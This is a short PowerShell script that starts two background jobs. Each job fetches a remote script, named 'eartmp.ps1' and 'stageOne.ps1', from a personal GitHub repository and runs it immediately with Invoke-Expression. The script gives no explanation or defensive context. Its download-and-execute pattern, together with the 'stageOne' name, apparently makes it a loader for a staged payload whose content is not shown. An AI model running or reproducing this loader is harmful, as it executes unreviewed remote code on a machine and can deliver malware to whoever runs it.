$job1 = Start-Job -ScriptBlock {
    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/eartmp.ps1" | Invoke-Expression
}

Wait-Job $job1
Receive-Job $job1

$job2 = Start-Job -ScriptBlock {
    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/stageOne.ps1" | Invoke-Expression
}

Wait-Job $job2
Receive-Job $job2